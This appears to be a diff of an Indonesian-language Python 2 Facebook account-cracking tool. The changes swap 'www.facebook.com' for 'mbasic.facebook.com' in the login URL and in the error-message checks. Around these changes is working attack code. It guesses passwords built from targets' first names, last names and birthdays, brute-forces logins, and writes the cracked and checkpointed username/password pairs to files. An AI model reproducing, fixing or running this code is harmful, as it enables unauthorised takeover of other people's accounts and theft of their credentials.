@@ -79,7 +79,7 @@ def login():
         pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword \x1b[1;91m:\x1b[1;92m ')
         tik()
         try:
-            br.open('https://m.facebook.com')
+            br.open('https://mbasic.facebook.com')
         except mechanize.URLError:
             print '\n\x1b[1;91m[!] Tidak ada koneksi'
             keluar()
@@ -360,7 +360,7 @@ def mini():
                 raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                 menu_hack()
             else:
-                if 'www.facebook.com' in y['error_msg']:
+                if 'mbasic.facebook.com' in y['error_msg']:
                     print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                     print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
@@ -380,7 +380,7 @@ def mini():
                         raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                         menu_hack()
                     else:
-                        if 'www.facebook.com' in y['error_msg']:
+                        if 'mbasic.facebook.com' in y['error_msg']:
                             print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                             print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
@@ -400,7 +400,7 @@ def mini():
                                 raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                 menu_hack()
                             else:
-                                if 'www.facebook.com' in y['error_msg']:
+                                if 'mbasic.facebook.com' in y['error_msg']:
                                     print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                     print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
@@ -421,7 +421,7 @@ def mini():
                                         raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                         menu_hack()
                                     else:
-                                        if 'www.facebook.com' in y['error_msg']:
+                                        if 'mbasic.facebook.com' in y['error_msg']:
                                             print '\x1b[1;91m[+] \x1b[1;92mDitemukan.'
                                             print '\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
                                             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mNama\x1b[1;97m     : ' + a['name']
@@ -498,7 +498,7 @@ def scrak():
                 berhasil.append('\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + username + ' | ' + passw)
                 back += 1
             else:
-                if 'www.facebook.com' in mpsh['error_msg']:
+                if 'mbasic.facebook.com' in mpsh['error_msg']:
                     cek = open('Cekpoint.txt', 'w')
                     cek.write(username + ' | ' + passw + '\n')
                     cek.close()
@@ -616,7 +616,7 @@ def pilih_super():
             if 'access_token' in q:
                 print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
             else:
-                if 'www.facebook.com' in q['error_msg']:
+                if 'mbasic.facebook.com' in q['error_msg']:
                     print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
                 else:
                     pass2 = b['first_name'] + '12345'
@@ -625,7 +625,7 @@ def pilih_super():
                     if 'access_token' in q:
                         print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2
                     else:
-                        if 'www.facebook.com' in q['error_msg']:
+                        if 'mbasic.facebook.com' in q['error_msg']:
                             print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                         else:
                             pass3 = b['last_name'] + '123'
@@ -634,7 +634,7 @@ def pilih_super():
                             if 'access_token' in q:
                                 print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3
                             else:
-                                if 'www.facebook.com' in q['error_msg']:
+                                if 'mbasic.facebook.com' in q['error_msg']:
                                     print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
                                 else:
                                     lahir = b['birthday']
@@ -644,7 +644,7 @@ def pilih_super():
                                     if 'access_token' in q:
                                         print '\x1b[1;97m[\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4
                                     else:
-                                        if 'www.facebook.com' in q['error_msg']:
+                                        if 'mbasic.facebook.com' in q['error_msg']:
                                             print '\x1b[1;97m[\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
         except:
             pass
@@ -696,7 +696,7 @@ def brute():
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
                         keluar()
                     else:
-                        if 'www.facebook.com' in mpsh['error_msg']:
+                        if 'mbasic.facebook.com' in mpsh['error_msg']:
                             ceks = open('Brutecekpoint.txt', 'w')
                             ceks.write(email + ' | ' + pw + '\n')
                             ceks.close()
@@ -2000,7 +2000,7 @@ def check_akun():
         if 'access_token' in mpsh:
             live.append(password)
             print '\x1b[1;97m[\x1b[1;92mLive\x1b[1;97m]  \x1b[1;97m' + username + ' | ' + password
-        elif 'www.facebook.com' in mpsh['error_msg']:
+        elif 'mbasic.facebook.com' in mpsh['error_msg']:
             cek.append(password)
             print '\x1b[1;97m[\x1b[1;93mCheck\x1b[1;97m] \x1b[1;97m' + username + ' | ' + password
         else:
